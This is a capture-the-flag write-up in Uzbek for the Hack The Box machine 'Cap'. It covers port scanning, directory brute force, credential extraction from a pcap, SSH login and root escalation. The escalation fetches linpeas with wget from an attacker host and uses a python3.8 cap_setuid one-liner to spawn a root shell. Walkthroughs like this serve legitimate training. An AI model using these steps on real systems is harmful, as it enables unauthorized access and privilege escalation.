HTB - Cap (Linux · Easy) - Writeup

Target IP Address: 10.10.10.245
Difficulty: Easy
---
1. Enumeration - Nmap Scan

Birinchi navbatda ochiq portlarni tekshirish uchun nmap skaneri ishlatildi:
nmap 10.10.10.245
Natija:
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

* 21/tcp (FTP): FTP xizmati ochiq
* 22/tcp (SSH): SSH xizmati ochiq
* 80/tcp (HTTP): Web server ishlamoqda
---
2. Web Enumeration - Directory Bruteforce
Web serverda yashirin kataloglarni topish uchun feroxbuster ishlatildi:
feroxbuster -u http://10.10.10.245 -w /usr/share/wordlists/dirb/common.txt -x .txt,.php,.pcap
Natija:
http://10.10.10.245/data/0
Bu katalogda .pcap fayl mavjud edi.
---
3. Credential Extraction - Wireshark
Paket tahlili uchun data/0 dan .pcap fayl yuklab olindi va Wireshark orqali ochildi.
Filtr ishlatildi:
http.request.method == "POST"
* Natija: Login va parol aniqlandi.
* Kiritilgan Credential: username:password
* SSH orqali tizimga foydalanuvchi sifatida kirdim.
ssh user@10.10.10.245
---
4. Privilege Escalation - Capability Exploit
Foydalanuvchining root bo‘lish imkoniyatlarini tekshirish uchun linpeas.sh ishlatildi:
wget http://10.10.14.59/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
Natija:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

Bu degani, Python 3.8 root huquqlariga ega bo‘lishi mumkin!
GTFOBins'dan foydalanib, root shell olish uchun quyidagi exploit ishlatildi:
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
Natija:
root
---
5. Flags Submission
* User Flag: /home/user/user.txt
* Root Flag: /root/root.txt
cat /home/user/user.txt
cat /root/root.txt
---
Xulosa
1. Nmap skaneri orqali ochiq portlar aniqlandi.
2. Feroxbuster bilan yashirin katalog topildi.
3. Wireshark orqali .pcap fayldan login credential o‘qib olindi.
4. LinPEAS bilan cap_setuid exploit orqali root huquqlariga ega bo‘lindi.
